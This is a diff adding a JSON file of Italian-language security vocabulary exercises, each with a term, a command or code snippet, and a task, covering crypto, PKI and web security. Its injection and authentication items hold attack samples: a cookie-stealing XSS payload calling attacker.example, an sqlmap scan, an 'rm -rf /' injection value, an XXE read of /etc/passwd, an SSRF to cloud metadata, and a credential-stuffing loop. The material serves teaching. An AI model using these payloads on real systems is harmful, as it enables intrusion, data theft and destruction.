@@ -1,0 +1,662 @@
+{
+  "fixes": [
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Symmetric Encryption",
+      "set": {
+        "command": "openssl enc -aes-256-cbc -salt -in plain.txt -out cipher.bin -pass pass:secret123",
+        "code": "from cryptography.fernet import Fernet\nkey = Fernet.generate_key()\nctext = Fernet(key).encrypt(b'secret message')\nprint(Fernet(key).decrypt(ctext))",
+        "task": "Cifra il contenuto di plain.txt con AES-256-CBC e una passphrase, producendo il file binario cipher.bin."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Plaintext",
+      "set": {
+        "command": "openssl enc -aes-256-cbc -d -in cipher.bin -out plain.txt -pass pass:secret123",
+        "task": "Recupera il testo in chiaro decifrando cipher.bin con la stessa passphrase usata in cifratura."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Ciphertext",
+      "set": {
+        "command": "openssl enc -aes-256-cbc -in messaggio.txt -out messaggio.enc -pass pass:topsecret && xxd messaggio.enc | head",
+        "task": "Genera il testo cifrato di messaggio.txt con AES-256-CBC e visualizzane i primi byte in esadecimale."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Encryption Key",
+      "set": {
+        "command": "openssl rand -hex 32 > aes.key",
+        "code": "import secrets\nkey = secrets.token_bytes(32)\nwith open('aes.key', 'wb') as f:\n    f.write(key)",
+        "task": "Genera una chiave di cifratura AES-256 casuale crittograficamente sicura e salvala su disco."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "AES (Advanced Encryption Standard)",
+      "set": {
+        "command": "openssl enc -aes-256-gcm -in dati.bin -out dati.enc -K $(openssl rand -hex 32) -iv $(openssl rand -hex 12)",
+        "code": "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\nkey = AESGCM.generate_key(bit_length=256)\nnonce = b'\\x00' * 12\nct = AESGCM(key).encrypt(nonce, b'segreto', None)",
+        "task": "Cifra dati.bin con AES-256 in modalita' GCM autenticata usando chiave e IV casuali."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "DES (Data Encryption Standard)",
+      "set": {
+        "command": "openssl enc -des-cbc -in vecchio.txt -out vecchio.enc -pass pass:legacy",
+        "task": "Cifra un file legacy con DES-CBC per dimostrare quanto sia ormai obsoleto questo algoritmo."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Stream Cipher",
+      "set": {
+        "command": "openssl enc -chacha20 -in streaming.dat -out streaming.enc -pass pass:flow",
+        "code": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms\nkey = b'\\x00' * 32\nnonce = b'\\x00' * 16\nc = Cipher(algorithms.ChaCha20(key, nonce), mode=None).encryptor()\nct = c.update(b'flusso')",
+        "task": "Cifra un file in streaming con ChaCha20, un moderno cifrario a flusso piu' veloce di AES su CPU senza accelerazione."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Block Cipher",
+      "set": {
+        "code": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nkey = b'\\x00' * 32\niv = b'\\x00' * 16\nc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()\nblock = c.update(b'A' * 16)",
+        "task": "Cifra un singolo blocco di 16 byte con AES in modalita' CBC per illustrare il funzionamento di un cifrario a blocchi."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Initialization Vector (IV)",
+      "set": {
+        "code": "import os\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\niv = os.urandom(16)\nkey = os.urandom(32)\nc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()",
+        "task": "Genera un IV casuale di 16 byte e usalo per inizializzare un cifrario AES-CBC, garantendo cifrature uniche."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_symmetric",
+      "english": "Key Exchange",
+      "set": {
+        "code": "from cryptography.hazmat.primitives.asymmetric import dh\nparams = dh.generate_parameters(generator=2, key_size=2048)\nprivate_key = params.generate_private_key()\npublic_key = private_key.public_key()",
+        "task": "Esegui uno scambio di chiavi Diffie-Hellman generando parametri e una coppia di chiavi effimere."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "Asymmetric Encryption",
+      "set": {
+        "command": "openssl rsautl -encrypt -inkey public.pem -pubin -in plain.txt -out cipher.bin",
+        "code": "from cryptography.hazmat.primitives.asymmetric import rsa, padding\nfrom cryptography.hazmat.primitives import hashes\npriv = rsa.generate_private_key(public_exponent=65537, key_size=2048)\nct = priv.public_key().encrypt(b'msg', padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))",
+        "task": "Cifra un messaggio usando la chiave pubblica RSA del destinatario in modo che solo lui possa decifrarlo."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "public key fingerprint",
+      "set": {
+        "command": "ssh-keygen -lf ~/.ssh/id_ed25519.pub",
+        "task": "Visualizza la fingerprint SHA256 della chiave pubblica SSH per confrontarla su un canale fuori banda."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "private key passphrase",
+      "set": {
+        "command": "ssh-keygen -p -f ~/.ssh/id_ed25519",
+        "task": "Cambia o imposta la passphrase che protegge la chiave privata SSH gia' esistente."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "Key Pair",
+      "set": {
+        "command": "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C \"alice@laptop\"",
+        "task": "Genera una nuova coppia di chiavi Ed25519 per l'autenticazione SSH con un commento identificativo."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "RSA (Rivest-Shamir-Adleman)",
+      "set": {
+        "command": "openssl genrsa -out private.pem 4096 && openssl rsa -in private.pem -pubout -out public.pem",
+        "code": "from cryptography.hazmat.primitives.asymmetric import rsa\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)\npublic_key = private_key.public_key()",
+        "task": "Genera una coppia di chiavi RSA a 4096 bit e esporta la chiave pubblica corrispondente in formato PEM."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "ECC (Elliptic Curve Cryptography)",
+      "set": {
+        "command": "openssl ecparam -name prime256v1 -genkey -noout -out ec_private.pem && openssl ec -in ec_private.pem -pubout -out ec_public.pem",
+        "code": "from cryptography.hazmat.primitives.asymmetric import ec\nprivate_key = ec.generate_private_key(ec.SECP256R1())\npublic_key = private_key.public_key()",
+        "task": "Genera una coppia di chiavi ECC sulla curva P-256, piu' compatta a parita' di sicurezza rispetto a RSA."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "Diffie-Hellman",
+      "set": {
+        "command": "openssl dhparam -out dhparams.pem 2048",
+        "code": "from cryptography.hazmat.primitives.asymmetric import dh\nparams = dh.generate_parameters(generator=2, key_size=2048)\nalice_priv = params.generate_private_key()\nbob_priv = params.generate_private_key()\nshared = alice_priv.exchange(bob_priv.public_key())",
+        "task": "Genera parametri Diffie-Hellman a 2048 bit per stabilire una chiave di sessione condivisa su canale insicuro."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "PGP (Pretty Good Privacy)",
+      "set": {
+        "command": "gpg --encrypt --recipient alice@example.com --armor messaggio.txt",
+        "task": "Cifra un messaggio con PGP usando la chiave pubblica della destinataria, producendo output ASCII armor."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "Forward Secrecy",
+      "set": {
+        "command": "openssl s_client -connect example.com:443 -cipher ECDHE-RSA-AES256-GCM-SHA384",
+        "task": "Negozia una connessione TLS forzando una cipher suite ECDHE per garantire la forward secrecy della sessione."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_asymmetric",
+      "english": "GPG (GNU Privacy Guard)",
+      "set": {
+        "command": "gpg --full-generate-key",
+        "task": "Avvia la procedura interattiva di GPG per generare una nuova coppia di chiavi OpenPGP."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "Hashing",
+      "set": {
+        "command": "sha256sum payload.exe",
+        "code": "import hashlib\nh = hashlib.sha256(b'contenuto da hashare').hexdigest()\nprint(h)",
+        "task": "Calcola l'hash SHA-256 di un file scaricato per verificarne l'integrita' contro il checksum pubblicato."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "Message Digest",
+      "set": {
+        "command": "openssl dgst -sha256 documento.pdf",
+        "code": "import hashlib\ndigest = hashlib.sha256(open('documento.pdf', 'rb').read()).digest()\nprint(digest.hex())",
+        "task": "Produci il message digest SHA-256 di un documento PDF da allegare alla firma digitale."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "Collision",
+      "set": {
+        "code": "import hashlib\nh1 = hashlib.md5(b'input_a').hexdigest()\nh2 = hashlib.md5(b'input_b').hexdigest()\nprint('collisione!' if h1 == h2 else 'distinti')",
+        "task": "Confronta gli hash MD5 di due input per illustrare il problema delle collisioni, ormai documentate su MD5."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "SHA-256 (Secure Hash Algorithm)",
+      "set": {
+        "command": "echo -n 'ciao mondo' | sha256sum",
+        "code": "import hashlib\nh = hashlib.sha256(b'ciao mondo').hexdigest()\nprint(h)",
+        "task": "Calcola l'hash SHA-256 di una stringa di test e confrontalo con il valore atteso noto."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "MD5 (Message Digest 5)",
+      "set": {
+        "command": "md5sum legacy.iso",
+        "code": "import hashlib\nh = hashlib.md5(b'attenzione: insicuro').hexdigest()\nprint(h)",
+        "task": "Calcola l'hash MD5 di un'immagine legacy solo per controllo di integrita' non crittografica."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "Salt",
+      "set": {
+        "code": "import hashlib, os\nsalt = os.urandom(16)\nh = hashlib.pbkdf2_hmac('sha256', b'password123', salt, 100000)\nprint(salt.hex(), h.hex())",
+        "task": "Aggiungi un salt casuale di 16 byte alla password prima di derivare l'hash con PBKDF2-HMAC-SHA256."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "Pepper",
+      "set": {
+        "code": "import hashlib, os\npepper = os.environ['APP_PEPPER'].encode()\nsalt = os.urandom(16)\nh = hashlib.pbkdf2_hmac('sha256', b'pwd' + pepper, salt, 100000)",
+        "task": "Combina la password con un pepper segreto letto da variabile d'ambiente prima dell'hashing PBKDF2."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "digital signature verification",
+      "set": {
+        "command": "gpg --verify pacchetto.tar.gz.sig pacchetto.tar.gz",
+        "task": "Verifica la firma digitale GPG di un archivio scaricato contro la chiave pubblica del maintainer."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_hash",
+      "english": "HMAC (Hash-based Message Authentication Code)",
+      "set": {
+        "command": "openssl dgst -sha256 -hmac 'chiave_segreta' messaggio.txt",
+        "code": "import hmac, hashlib\nkey = b'chiave_segreta'\ntag = hmac.new(key, b'messaggio', hashlib.sha256).hexdigest()\nprint(tag)",
+        "task": "Calcola un HMAC-SHA256 di un messaggio con una chiave segreta per garantirne autenticita' e integrita'."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "CA (Certificate Authority)",
+      "set": {
+        "command": "openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.pem -days 3650 -subj '/CN=MyInternalCA'",
+        "task": "Crea un certificato radice di CA interna autofirmato valido dieci anni, con chiave RSA-4096."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "CSR (Certificate Signing Request)",
+      "set": {
+        "command": "openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr -subj '/CN=app.example.com'",
+        "task": "Genera una CSR con una nuova chiave RSA-2048 da inviare alla CA per ottenere il certificato del server."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "X.509",
+      "set": {
+        "command": "openssl x509 -in cert.pem -text -noout",
+        "task": "Ispeziona tutti i campi di un certificato X.509 per controllare subject, issuer, validita' ed estensioni."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "CRL (Certificate Revocation List)",
+      "set": {
+        "command": "openssl crl -in ca.crl -text -noout",
+        "task": "Stampa il contenuto leggibile di una Certificate Revocation List per ispezionare i seriali revocati."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "OCSP (Online Certificate Status Protocol)",
+      "set": {
+        "command": "openssl ocsp -issuer issuer.pem -cert leaf.pem -url http://ocsp.example.com -text",
+        "task": "Interroga il responder OCSP della CA per verificare in tempo reale lo stato di revoca di un certificato."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "Root Certificate",
+      "set": {
+        "command": "openssl x509 -in /etc/ssl/certs/ca-certificates.crt -text -noout | grep 'Issuer:' | head",
+        "task": "Esplora i certificati radice fidati dal sistema per individuare quali CA sono installate di default."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "Intermediate Certificate",
+      "set": {
+        "command": "openssl s_client -connect example.com:443 -showcerts < /dev/null",
+        "task": "Scarica l'intera catena TLS di un server per verificare che invii anche i certificati intermedi insieme al foglia."
+      }
+    },
+    {
+      "level": "4",
+      "lesson": "crypto_pki",
+      "english": "Trust Chain",
+      "set": {
+        "command": "openssl verify -CAfile ca.pem -untrusted intermediate.pem leaf.pem",
+        "task": "Verifica che il certificato foglia possa essere validato risalendo l'intera catena di fiducia fino alla CA radice."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "SQL Injection (SQLi)",
+      "set": {
+        "command": "sqlmap -u \"http://target.com/page?id=1\" --dbs --batch",
+        "code": "# VULNERABILE - solo a scopo didattico\nuser_input = \"1' OR '1'='1\"\nquery = f\"SELECT * FROM users WHERE id = '{user_input}'\"\nprint(query)",
+        "task": "Esegui una scansione SQLMap automatizzata contro un parametro vulnerabile per enumerare i database disponibili."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "Cross-Site Scripting (XSS)",
+      "set": {
+        "code": "# Payload XSS classico - solo a scopo didattico\npayload = \"<script>fetch('https://attacker.example/?c=' + document.cookie)</script>\"\nprint(f'<input value=\"{payload}\">')",
+        "task": "Costruisci un payload XSS minimale che esfiltra i cookie di sessione verso un endpoint controllato dall'attaccante."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "Stored XSS",
+      "set": {
+        "code": "# Stored XSS - input salvato nel DB e riproposto a tutti gli utenti\ncomment = \"<img src=x onerror=alert('XSS')>\"\n# Backend salva comment cosi' com'e' e lo mostra ad ogni visita",
+        "task": "Simula la persistenza di un payload XSS in un campo commento, mostrando come colpisca ogni visitatore della pagina."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "Reflected XSS",
+      "set": {
+        "code": "# Reflected XSS via parametro URL\nimport urllib.parse\npayload = \"<script>alert('riflesso')</script>\"\nurl = f\"https://vuln.example/search?q={urllib.parse.quote(payload)}\"\nprint(url)",
+        "task": "Costruisci un URL malevolo che riflette uno script nella pagina dei risultati di ricerca di un sito vulnerabile."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "DOM-based XSS",
+      "set": {
+        "code": "// DOM XSS - il client legge da location.hash e scrive nel DOM\nconst raw = location.hash.substring(1);\ndocument.getElementById('out').innerHTML = raw; // vulnerabile\n// Visita la pagina con #<img src=x onerror=alert(1)>",
+        "task": "Riproduci un DOM-based XSS che sfrutta location.hash inserito senza sanitizzazione tramite innerHTML."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "Command Injection",
+      "set": {
+        "code": "# VULNERABILE - non usare in produzione\nimport os\nfilename = request.args['file']  # es. \"; rm -rf /\"\nos.system(f'cat {filename}')",
+        "task": "Mostra come passare l'input utente direttamente a os.system permetta l'iniezione di comandi shell arbitrari."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "LDAP Injection",
+      "set": {
+        "code": "# Payload LDAP injection per bypass di login\nuser = \"*)(uid=*\"\npassword = \"anything\"\nfilter_str = f\"(&(uid={user})(userPassword={password}))\"\n# Il filtro diventa permissivo e autentica chiunque",
+        "task": "Costruisci un filtro LDAP malformato che bypassa l'autenticazione manipolando il filtro di ricerca delle credenziali."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "XML External Entity (XXE)",
+      "set": {
+        "code": "# Payload XXE che legge /etc/passwd dal server vulnerabile\npayload = '''<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<data>&xxe;</data>'''\n# Inviare come body XML al parser vulnerabile",
+        "task": "Crea un payload XXE che dichiara un'entita' esterna puntando a /etc/passwd per esfiltrarne il contenuto."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "Sanitization",
+      "set": {
+        "code": "import bleach\nuntrusted = '<script>alert(1)</script><b>ok</b>'\nsafe = bleach.clean(untrusted, tags=['b', 'i'], strip=True)\nprint(safe)  # <b>ok</b>",
+        "task": "Sanifica una stringa HTML non fidata con bleach mantenendo solo i tag di formattazione consentiti."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_injection",
+      "english": "Parameterized Query",
+      "set": {
+        "code": "import sqlite3\nconn = sqlite3.connect('app.db')\ncur = conn.cursor()\n# Parametrizzazione: l'input non viene mai interpretato come SQL\ncur.execute('SELECT * FROM users WHERE name = ?', (user_input,))",
+        "task": "Riscrivi una query usando il placeholder parametrizzato del driver per neutralizzare l'iniezione SQL."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "Session Management",
+      "set": {
+        "code": "from flask import session\nimport secrets\nsession.permanent = True\nsession['user_id'] = user.id\nsession['csrf'] = secrets.token_urlsafe(32)",
+        "task": "Inizializza una sessione lato server salvando l'ID utente e un token CSRF generato in modo crittograficamente sicuro."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "Session Hijacking",
+      "set": {
+        "command": "curl -H \"Cookie: sessionid=RUBATO_DA_ATTACCANTE\" https://app.example.com/account",
+        "task": "Simula un dirottamento di sessione riproducendo manualmente un cookie rubato in una richiesta autenticata."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "Session Fixation",
+      "set": {
+        "code": "from flask import session\n# Dopo un login riuscito rigenera l'ID di sessione\nold_data = dict(session)\nsession.clear()\nsession.update(old_data)\nsession.modified = True",
+        "task": "Rigenera l'ID di sessione subito dopo il login per neutralizzare gli attacchi di session fixation."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "HttpOnly Cookie",
+      "set": {
+        "command": "curl -I https://app.example.com/login | grep -i 'set-cookie'",
+        "code": "response.set_cookie('session', token, httponly=True, secure=True, samesite='Strict')",
+        "task": "Imposta il cookie di sessione con il flag HttpOnly per impedire a script client-side di accedervi tramite document.cookie."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "JWT (JSON Web Token)",
+      "set": {
+        "code": "import jwt\ntoken = jwt.encode({'user': 'alice', 'role': 'admin'}, 'mysecret', algorithm='HS256')\nprint(token)\nclaims = jwt.decode(token, 'mysecret', algorithms=['HS256'])",
+        "task": "Emetti un token JWT firmato HS256 con claim utente e ruolo, poi verificalo decodificandolo con la stessa chiave segreta."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "OAuth 2.0",
+      "set": {
+        "command": "curl -X POST https://auth.example.com/oauth/token -d 'grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app/cb&client_id=CID&client_secret=CS'",
+        "task": "Scambia un authorization code per un access token contro l'endpoint OAuth 2.0 del provider di identita'."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "OpenID Connect (OIDC)",
+      "set": {
+        "command": "curl https://accounts.google.com/.well-known/openid-configuration | jq '.authorization_endpoint, .token_endpoint, .jwks_uri'",
+        "task": "Scarica il documento di discovery OIDC del provider per trovare gli endpoint di autorizzazione, token e JWKS."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "SAML (Security Assertion Markup Language)",
+      "set": {
+        "command": "curl https://idp.example.com/saml/metadata > idp-metadata.xml && xmllint --xpath '//*[local-name()=\"SingleSignOnService\"]/@Location' idp-metadata.xml",
+        "task": "Scarica i metadati SAML dell'identity provider e estrai l'URL dell'endpoint SingleSignOnService."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "Credential Stuffing",
+      "set": {
+        "code": "# Pattern di credential stuffing - SIMULAZIONE DIFENSIVA\nimport requests\nfor user, pwd in leaked_pairs:  # da un breach pubblico\n    r = requests.post('https://app.example/login', data={'u': user, 'p': pwd})\n    if r.status_code == 200:\n        log_compromise(user)",
+        "task": "Simula il pattern di un attacco di credential stuffing per testare MFA e rate limiting del tuo endpoint di login."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_auth",
+      "english": "Secure Cookie",
+      "set": {
+        "code": "response.set_cookie('session', token, secure=True, httponly=True, samesite='Lax')",
+        "task": "Imposta il flag Secure sul cookie di sessione cosi' che venga inviato esclusivamente su connessioni HTTPS."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_owasp",
+      "english": "Broken Access Control",
+      "set": {
+        "code": "# VULNERABILE - manca il controllo di autorizzazione\n@app.route('/api/user/<uid>/profile')\ndef profile(uid):\n    # Nessun controllo che current_user.id == uid: IDOR!\n    return db.users.find_one({'id': uid})",
+        "task": "Mostra come la mancanza di un controllo di autorizzazione lato server permetta a un utente di accedere ai profili altrui (IDOR)."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_owasp",
+      "english": "Security Misconfiguration",
+      "set": {
+        "command": "curl -I https://app.example.com/admin | grep -iE 'server:|x-powered-by:'",
+        "code": "# VULNERABILE - debug attivo in produzione\napp.run(host='0.0.0.0', debug=True)\n# Espone interactive console su errori, esecuzione remota di codice",
+        "task": "Verifica con curl se il server espone header informativi che rivelano stack tecnologico e versioni a un attaccante."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_owasp",
+      "english": "Vulnerable and Outdated Components",
+      "set": {
+        "command": "pip-audit -r requirements.txt",
+        "task": "Esegui pip-audit contro il file delle dipendenze per identificare librerie con vulnerabilita' CVE note."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_owasp",
+      "english": "Server-Side Request Forgery (SSRF)",
+      "set": {
+        "code": "# VULNERABILE - SSRF su metadata endpoint AWS\nimport requests\nurl = request.args['url']  # es. http://169.254.169.254/latest/meta-data/\nr = requests.get(url)  # legge credenziali IAM dal metadata service\nreturn r.text",
+        "task": "Mostra come un fetch lato server senza allowlist permetta di leggere il metadata service interno del cloud provider."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "WAF ruleset",
+      "set": {
+        "command": "curl -i 'https://app.example.com/?q=<script>alert(1)</script>'",
+        "task": "Invia una richiesta con payload XSS evidente per verificare che il ruleset OWASP CRS del WAF la blocchi con 403."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "Content Security Policy (CSP)",
+      "set": {
+        "command": "curl -I https://app.example.com/ | grep -i 'content-security-policy'",
+        "code": "response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'\"",
+        "task": "Imposta un header CSP rigoroso che permetta solo script dello stesso origine con nonce e blocchi gli oggetti embedded."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "HSTS (HTTP Strict Transport Security)",
+      "set": {
+        "command": "curl -I https://example.com | grep -i 'strict-transport-security'",
+        "code": "response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'",
+        "task": "Configura un header HSTS valido un anno con includeSubDomains per forzare il browser a usare solo HTTPS."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "CSRF Token",
+      "set": {
+        "code": "import secrets\nfrom flask import session\nsession['csrf'] = secrets.token_urlsafe(32)\n# Nel form HTML: <input type='hidden' name='csrf' value='{{ session.csrf }}'>\n# Sul server, rifiuta richieste POST senza un token che corrisponde",
+        "task": "Genera un token CSRF unico per la sessione e iniettalo nei form per rifiutare richieste POST non legittime."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "Rate Limiting",
+      "set": {
+        "code": "from flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\nlimiter = Limiter(get_remote_address, app=app, default_limits=['200 per hour'])\n\n@app.route('/login', methods=['POST'])\n@limiter.limit('5 per minute')\ndef login():\n    pass",
+        "task": "Applica un limite di cinque tentativi al minuto sull'endpoint di login per ostacolare attacchi di forza bruta."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "SameSite Cookie Attribute",
+      "set": {
+        "code": "response.set_cookie('session', token, samesite='Strict', secure=True, httponly=True)",
+        "task": "Imposta l'attributo SameSite a Strict sul cookie di sessione per impedire che venga inviato in richieste cross-site."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "Input Validation",
+      "set": {
+        "code": "from pydantic import BaseModel, EmailStr, conint\n\nclass SignupReq(BaseModel):\n    email: EmailStr\n    age: conint(ge=18, le=120)\n\nreq = SignupReq(**request.json)  # solleva eccezione se invalido",
+        "task": "Valida l'input del form di registrazione con pydantic rifiutando email malformate ed eta' fuori dal range consentito."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "Output Encoding",
+      "set": {
+        "code": "import html\nuntrusted = '<script>alert(1)</script>'\nsafe = html.escape(untrusted)\nprint(safe)  # &lt;script&gt;alert(1)&lt;/script&gt;",
+        "task": "Esegui l'output encoding HTML su una stringa non fidata prima di renderizzarla, neutralizzando l'XSS riflesso."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "CORS (Cross-Origin Resource Sharing)",
+      "set": {
+        "command": "curl -i -H 'Origin: https://evil.example' https://api.example.com/data | grep -i 'access-control'",
+        "code": "from flask_cors import CORS\nCORS(app, resources={r'/api/*': {'origins': ['https://app.example.com']}}, supports_credentials=True)",
+        "task": "Verifica con curl quali origini la tua API accetta tramite gli header Access-Control-Allow-Origin restituiti."
+      }
+    },
+    {
+      "level": "5",
+      "lesson": "web_defense",
+      "english": "Security Headers",
+      "set": {
+        "command": "curl -I https://app.example.com/ | grep -iE 'x-frame|x-content|referrer|content-security|strict-transport'",
+        "task": "Ispeziona tutti gli header di sicurezza di una risposta per verificare che il web server sia correttamente irrobustito."
+      }
+    }
+  ]
+}
